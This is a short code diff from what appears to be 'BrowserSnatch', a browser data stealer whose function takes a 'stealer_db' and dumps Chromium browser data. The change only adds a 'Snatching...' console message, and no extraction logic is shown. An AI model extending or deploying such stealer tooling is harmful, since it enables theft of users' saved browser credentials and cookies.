@@ -56,6 +56,7 @@ void Visualizer::printMenu() {
 BOOL Visualizer::default_settings(std::string converted_username, std::string stealer_db)
 {
     std::cout << "BrowserSnatch Executed with {default settings}" << std::endl;
+    std::cout << "Snatching..." << std::endl;
     if (!chromium_parser(converted_username, stealer_db))
         std::cout << "Chromium Browsers dump failed!" << std::endl;
 
